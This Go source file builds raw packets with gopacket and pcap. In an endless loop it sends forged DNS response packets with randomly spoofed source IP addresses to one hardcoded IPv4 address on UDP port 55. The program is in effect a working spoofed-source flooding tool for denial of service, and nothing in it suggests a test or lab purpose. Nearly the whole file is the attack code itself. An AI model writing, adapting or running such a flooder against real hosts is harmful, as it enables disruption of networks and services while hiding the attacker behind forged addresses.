package main

import (
	"fmt"
	"net"
	"runtime"
	"flag"
	"time"


	"math/rand"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func ErrPanic(err error) {
	if err != nil {
		panic(err)
	}
}

var AckTime uint64 = 1

func init(){
	flag.Uint64Var(&AckTime,"t",5,"acktime")
	flag.Parse()
	runtime.GOMAXPROCS(runtime.NumCPU()*2)
}

func main() {

	iface, err := net.InterfaceByName("enp1s0f0")

	if err != nil {
		panic(err)
	}

	addrs, err := iface.Addrs()

	if err != nil {
		panic(err)
	}
	var ip net.IP

	for _, Addr := range addrs {
		ipnet, _ := Addr.(*net.IPNet)

		if ip = ipnet.IP.To4(); ip != nil {
			fmt.Println("use ip:", ipnet.IP.String())
			break
		}

	}

	hwaddr := iface.HardwareAddr
	fmt.Println("hwaddr:", hwaddr)
	println("-----------------------")
	//addr:=addrs[1]
	//fmt.Println("IP:",addr.String())

	handler, err := pcap.OpenLive("enp1s0f0", 1024, false, pcap.BlockForever)
	ErrPanic(err)
	defer handler.Close()

	go sendDNS(handler, hwaddr, ip)
	time.Sleep(time.Second * time.Duration(AckTime))

}

func RandInt(min, max int32) int32 {
	if min >= max || min == 0 || max == 0 {
		return max
	}
	return rand.Int31n(max-min) + min
}

func sendDNS(handler *pcap.Handle, hwaddr net.HardwareAddr, ip net.IP) {

	for {

		buf := gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{ComputeChecksums: true, FixLengths: true}

		srcIP:=fmt.Sprintf("%d.%d.%d.%d",RandInt(8,120,),RandInt(5,200),RandInt(5,250),RandInt(2,255))
		//fmt.Println("use ip:",srcIP)
		quetions:= []layers.DNSQuestion{layers.DNSQuestion{
			Name:[]byte("www.1238766.com"),
			Type:layers.DNSTypeCNAME,
			Class:layers.DNSClassIN,
		}}

		dns :=layers.DNS{
			ID:0x22ff,
			QR:true,
			QDCount:1,
			Questions:quetions,
		}

		ipv4 := layers.IPv4{
			SrcIP:    net.ParseIP(srcIP).To4(),
			DstIP:    net.ParseIP("180.163.194.149").To4(),
			Version:  4,
			TTL:      64,
			Protocol: layers.IPProtocolUDP,
		}

		udp := layers.UDP{
			SrcPort: 54321,
			DstPort: 55,
		}

		udp.SetNetworkLayerForChecksum(&ipv4)

		ether := layers.Ethernet{
			SrcMAC:       hwaddr,//48:46:fb:da:6e:a3
			DstMAC:       net.HardwareAddr{0x48, 0x46, 0xfb, 0xda, 0x6e, 0xa3},
			EthernetType: layers.EthernetTypeIPv4,
		}

		err := gopacket.SerializeLayers(buf, opts, &ether, &ipv4, &udp,&dns)
		err = handler.WritePacketData(buf.Bytes())
		ErrPanic(err)
	}

}
